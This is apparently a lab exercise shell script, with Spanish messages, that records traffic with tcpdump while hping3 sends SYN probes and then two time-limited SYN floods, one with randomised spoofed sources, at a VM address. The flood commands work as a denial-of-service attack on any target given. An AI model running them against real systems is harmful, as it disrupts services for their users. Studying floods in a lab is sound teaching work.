#!/bin/sh
set -eu

TARGET="${1:-192.168.56.10}"
PORT="${2:-80}"
PCAP="ejercicio6-vm-http-syn.pcap"

echo "Capturando trafico TCP al puerto $PORT en $PCAP"
sudo tcpdump -ni eth0 -c 3000 "tcp port $PORT" -w "$PCAP" &
TCPDUMP_PID=$!
sleep 1

echo "Reconocimiento SYN"
sudo hping3 -S -p "$PORT" -c 5 "$TARGET"

echo "Prueba flood limitada a 2 segundos"
sudo timeout 2 hping3 -S -p "$PORT" --flood "$TARGET" || true

echo "Prueba flood con --rand-source limitada a 2 segundos"
sudo timeout 2 hping3 -S -p "$PORT" --flood --rand-source "$TARGET" || true

wait "$TCPDUMP_PID" || true
echo "Resumen:"
tcpdump -nn -r "$PCAP" 2>/dev/null | head -20
